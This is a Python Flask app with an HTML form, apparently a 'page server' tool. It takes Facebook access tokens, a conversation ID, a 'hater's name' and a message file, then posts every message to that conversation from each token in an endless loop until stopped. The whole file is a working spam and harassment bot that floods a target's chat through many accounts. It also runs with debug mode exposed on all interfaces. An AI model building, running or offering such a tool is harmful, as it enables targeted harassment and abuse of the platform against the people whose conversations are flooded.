from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝙿𝙰𝙶𝙴 𝚂𝙴𝚁𝚅𝙴𝚁</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/Vq2GRWc/20241109-161940.png');
      background-size: cover;
      background-repeat: no-repeat;
     color: white;
    }
    .container {
      max-width: 400px;
      height: auto;
      border: 2px double white;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 60px ;
      border: non;
      color: white;
    }
    .form-control {
      outline: 10px red;
      border: 2px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 0px;
      border-radius: 10px;
   }
   .header { 
    text-align: center;
    max-width: 400px;
    height: 80;
    position : middle ;
    border-radius: 10px;
    padding: 10px;
    margin-bottom: 0px;
    margin : 14px;
    box-shadow: 0 0 10px ;
    border: 2px double white;
    color: white;
    background: Red;
    
 }
    .btn-submit { width: 100%; border: 2px double white; margin-top: 10px; }
    .footer {                               
            width: 400px;
            hight: 0;
            
            
            background-color: white;
            color: black;
            border: 2px double white;
            border-radius: 20px;
            margin-top: 20px;
            margin: 14px;
            text-align: center;
            padding: 20px;
        
            box-shadow: 0 0 10px;
        }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt- text-white">𝐎𝐖𝐍𝐄𝐑 => 𝐒𝐀𝐇𝐈𝐋
    <h3 class="mt-"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝙿𝙰𝙶𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">𝚂𝙴𝙻𝙴𝙲𝚃 𝚃𝙾𝙺𝙴𝙽 𝚃𝚈𝙿:</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">𝚂𝚒𝚗𝚐𝚕𝚎 𝚃𝚘𝚔𝚎𝚗</option>
          <option value="multiple">𝙼𝚞𝚕𝚝𝚒 𝚃𝚘𝚔𝚎𝚗</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label"></label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">𝚂𝙴𝙻𝙴𝙲𝚃 𝚃𝙾𝙺𝙴𝙽 𝙵𝙸𝙻𝙴:</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝙴𝙽𝚃𝙴𝚁 𝙲𝙾𝙽𝚅𝙾 𝙸𝙳 𝙻𝙸𝙽𝙺:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝙴𝙽𝚃𝙴𝚁 𝙷𝙰𝚃𝚃𝙴𝚁𝚂 𝙽𝙰𝙼𝙴:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝙴𝙽𝚃𝙴𝚁 𝚃𝙸𝙼𝙴 𝙳𝙴𝙻𝙰𝚈 𝙸𝙽 (𝚂𝙴𝙲):</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝚂𝙴𝙻𝙴𝙲𝚃 𝚈𝙾𝚄𝚃 𝙽𝙿 𝙵𝙸𝙻𝙴:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">𝚁𝚄𝙽</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">𝙴𝙽𝚃𝙴𝚁 𝙲𝙾𝙽𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝙸𝙳 𝚃𝙾 𝚂𝚃𝙾𝙿:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">𝚂𝚃𝙾𝙿</button>
    </form>
  </div>
<div class="footer">
        <div class="footer-box">
              <a href="https://wa.me/+917357756994" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
           
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
